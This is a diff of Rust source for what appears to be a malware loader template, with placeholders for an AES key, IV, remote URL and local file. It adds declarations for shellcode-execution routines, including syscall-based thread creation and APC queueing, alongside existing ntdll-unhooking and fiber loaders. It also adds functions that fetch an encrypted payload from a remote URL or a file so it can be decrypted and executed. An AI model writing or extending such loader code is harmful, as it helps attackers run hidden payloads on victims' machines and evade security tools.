@@ -1,5 +1,6 @@
 use std::sync::{Arc, Mutex};
 use lazy_static::lazy_static;
+use std::fs;
 
 lazy_static! {
     static ref MUTEX: Arc<Mutex<i32>> = Arc::new(Mutex::new(0));
@@ -42,23 +43,31 @@ extern "C" {
         iv: *const u8,
         iv_len: usize,
     ) -> DecryptResult;
+
+
+    pub fn create_local_thread_syscall_run(code: *const u8, code_len: usize);
+    pub fn queue_apc_thread_syscall_run(code: *const u8, code_len: usize);
     pub fn ntdll_unhook_loader_run(code: *const u8, code_len: usize);
     pub fn heapapi_dynamic_loader_run(code: *const u8, code_len: usize);
     pub fn nt_queue_apc_thread_ex_local_run(code: *const u8, code_len: usize);
     pub fn create_fiber_run(code: *const u8, code_len: usize);
     pub fn memmap2_transmute_run(code: *const u8, code_len: usize);
+
     pub fn get_remote_bin(url: *const c_char, out_len: *mut usize) -> *mut u8;
+    
     }
+
+
 
 fn payload_execution() {
     
-
         unsafe {
             
             const AES_KEY: [u8; 16] = {AES_KEY};
             const AES_IV: [u8; 16] = {AES_IV};
             #[cfg(feature = "remote")]
             let CT = get_data_from_url("{REMOTE_URL}"); 
+
             #[cfg(feature = "separate")]
             let CT = read_file("{LOCAL_FILE}");
 
@@ -83,3 +92,24 @@ fn payload_execution() {
    
 }
 
+
+#[cfg(feature = "separate")]
+pub fn read_file(file_name: &str) -> Vec<u8> {
+    match fs::read(file_name) {
+        Ok(buffer) => {
+            buffer
+        }
+        Err(e) => {
+            Vec::new()
+        }
+    }
+}
+
+
+#[cfg(feature = "remote")]
+fn get_data_from_url(url: &str) -> Vec<u8> {
+    let c_url = CString::new(url).unwrap();
+    let mut length: usize = 0;
+    let data_ptr = unsafe {{get_remote_bin(c_url.as_ptr(), &mut length as *mut usize) }};
+    unsafe {{ Vec::from_raw_parts(data_ptr, length, length) }}
+}
